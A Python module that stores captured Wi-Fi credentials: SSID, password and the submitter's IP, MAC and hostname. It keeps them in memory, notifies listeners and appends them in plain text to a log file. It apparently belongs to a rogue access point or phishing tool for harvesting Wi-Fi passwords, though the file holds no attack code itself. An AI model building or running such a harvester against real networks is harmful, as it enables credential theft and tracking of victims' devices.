import os
from dataclasses import dataclass
from typing import List, Callable

from config.settings import CRED_LOG_FILE, LOG_DIR


@dataclass
class Credential:
    timestamp: str
    ssid: str
    password: str
    ip: str
    mac: str
    hostname: str


class CredentialStore:
    def __init__(self):
        os.makedirs(LOG_DIR, exist_ok=True)
        self._creds: List[Credential] = []
        self._listeners: List[Callable[[Credential], None]] = []

    def add(self, cred: Credential) -> None:
        self._creds.append(cred)
        self._write(cred)
        for cb in self._listeners:
            cb(cred)

    def on_new(self, callback: Callable[[Credential], None]) -> None:
        self._listeners.append(callback)

    def all(self) -> List[Credential]:
        return list(self._creds)

    def _write(self, cred: Credential) -> None:
        with open(CRED_LOG_FILE, 'a') as f:
            f.write(
                f"[{cred.timestamp}]\n"
                f"  SSID:     {cred.ssid}\n"
                f"  Password: {cred.password}\n"
                f"  IP:       {cred.ip}\n"
                f"  MAC:      {cred.mac}\n"
                f"  Hostname: {cred.hostname}\n"
                f"{'─' * 44}\n"
            )
